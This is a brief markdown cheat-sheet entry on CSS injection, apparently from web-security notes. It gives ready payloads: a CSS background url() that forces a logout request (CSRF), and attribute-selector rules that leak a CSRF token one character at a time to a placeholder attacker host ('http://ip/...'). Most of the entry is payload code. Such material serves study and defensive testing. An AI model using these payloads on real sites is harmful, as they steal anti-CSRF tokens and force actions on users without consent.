# CSS Injection
- expression()
- import URL (CSRF)
    - Referer
    - url(...)

        ```
        body {
            background:
            url(http://example.com/logout);
        }
        ```

    - ...

- CSS Selector

    > Read part of HTML source, like CSRF Token

    ```css
    input[name=csrf][value^="1"]{background:url(http://ip/1)}   X
    input[name=csrf][value^="2"]{background:url(http://ip/2)}   O
    input[name=csrf][value^="2a"]{background:url(http://ip/2a)} X
    input[name=csrf][value^="2e"]{background:url(http://ip/2e)} O
    ...
    <input type="text" name="csrf" avlue="2e58ca...">
    ```
